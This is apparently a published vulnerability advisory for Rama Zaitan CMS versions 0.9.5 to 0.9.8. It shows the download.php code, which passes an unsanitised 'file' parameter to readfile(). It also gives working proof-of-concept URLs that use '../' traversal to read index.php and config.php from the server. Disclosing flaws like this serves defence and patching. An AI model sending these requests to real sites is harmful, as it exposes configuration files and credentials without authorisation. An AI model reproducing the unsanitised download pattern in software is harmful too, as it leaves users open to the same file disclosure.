Rama CMS <= 0.9.8 (download.php file) File Disclosure Vulnerability 
===================================================================


#Start info: {
#
#Script Name:   Rama Zaitan Cms
# Script Project: http://sourceforge.net/project/showfiles.php?group_id=212495&package_id=255590
# Download:       http://sourceforge.net/project/downloading.php?group_id=212495&filename=cms975.zip&a=5782381
#
#  0.9.5 <= Versions <=0.9.8  
#
# by Br0ly.
#
# Brasil.
#
# Sorry for my bad english. ;/
#
#End info }


Php code :
<?php
$dir  = &#039;uploads/&#039;;
$file = $_GET[&#039;file&#039;]; <-----------------------------------------------------------------> Vul

header(&#039;Content-Disposition: attachment; filename=&#039;.$file);

switch ($_GET[&#039;type&#039;]) {
    case &#039;Doc&#039;:
        header (&#039;Content-type: application/msword&#039;);
        break;
    case &#039;Excel&#039;:
        header (&#039;Content-type: application/vnd.ms-excel&#039;);
        break;
    case &#039;ZIP&#039;:
        header (&#039;Content-type: application/zip&#039;);
        break;
    case &#039;PPT&#039;:
        header (&#039;Content-type: application/vnd.ms-powerpoint&#039;);
        break;
    case &#039;PDF&#039;:
        header (&#039;Content-type: application/pdf&#039;);
        break;

    default: header (&#039;application/force-download&#039;);
}

readfile("$dir$file");  <-------------------------------------------------------> Vul
?>

p0f :

http://locahost/ramacms/download.php?file=download.php
http://locahost/ramacms/download.php?file=../index.php
http://locahost/ramacms/download.php?file=../config.php

;D



